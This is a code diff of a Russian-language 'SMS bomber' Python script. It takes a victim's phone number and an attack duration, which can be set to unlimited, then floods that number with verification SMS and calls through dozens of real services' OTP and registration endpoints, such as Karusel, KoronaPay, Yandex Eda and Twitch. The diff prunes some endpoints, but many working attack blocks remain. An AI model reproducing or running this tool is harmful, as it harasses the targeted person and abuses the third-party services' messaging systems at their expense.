@@ -181,7 +181,7 @@ if _phone[0] == '9':
 
     _phone = '7'+_phone
 
-kol = input("\n \033[31mВремя атаки (Введите больше 30 | 0 - бесконечно) > \033[0m\033[94m ")
+kol = input("\n \033[31mВремя атаки (Сек) (Введите больше 30 | 0 - бесконечно) > \033[0m\033[94m ")
 if kol == str(0):
     kol = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 start_time = time.time() 
@@ -309,18 +309,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
@@ -408,19 +396,6 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -692,18 +667,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
-                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-            R = R + 1
-            print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
                                                      "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode",
                                                      "phone": _phone, "registration": "N", })
@@ -814,17 +777,6 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -1105,31 +1057,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -1281,18 +1211,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -1321,17 +1239,6 @@ if call == str(2):
             R = R + 1
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1648,31 +1555,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -1828,18 +1713,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -1875,32 +1748,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar отправлено|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -2105,31 +1955,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -2277,30 +2105,6 @@ if call == str(2):
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2322,19 +2126,6 @@ if call == str(2):
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2348,7 +2139,6 @@ if call == str(2):
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2364,19 +2154,16 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                           json={"phone_number": "+" + _phone})
@@ -2384,7 +2171,6 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2395,12 +2181,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                           json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
@@ -2409,7 +2193,6 @@ if call == str(2):
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2420,7 +2203,6 @@ if call == str(2):
             print('[+] SMS отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2431,7 +2213,6 @@ if call == str(2):
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2516,27 +2297,6 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-
-            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-            R = R + 1
-            print('[+] Delivery отправлено! || Кол-во - ' + str(R))
-            print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        try:
-            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
-                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
-                                'deviceToken': '*'}, headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            print('[+] Grab отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -2606,18 +2366,6 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -2710,19 +2458,6 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -2994,18 +2729,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
-                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-            R = R + 1
-            print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://www.nl.ua',
                           data={"component": "bxmaker.authuserphone.login",
                                 "sessid": "bf70db951f54b837748f69b75a61deb4",
@@ -3117,17 +2840,6 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -3409,31 +3121,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -3585,18 +3275,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -3625,17 +3303,6 @@ if call == str(2):
             R = R + 1
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3953,31 +3620,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -4133,18 +3778,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -4180,17 +3813,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi отправлено!|| Кол-во - ' + str(R))
@@ -4200,18 +3822,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -4414,31 +4024,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -4586,30 +4174,6 @@ if call == str(2):
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -4629,18 +4193,6 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -4830,19 +4382,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-
-            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-            R = R + 1
-            print('[+] Delivery отправлено! || Кол-во - ' + str(R))
-            print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
@@ -4893,18 +4432,6 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -4997,19 +4524,6 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -5281,18 +4795,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
-                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-            R = R + 1
-            print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
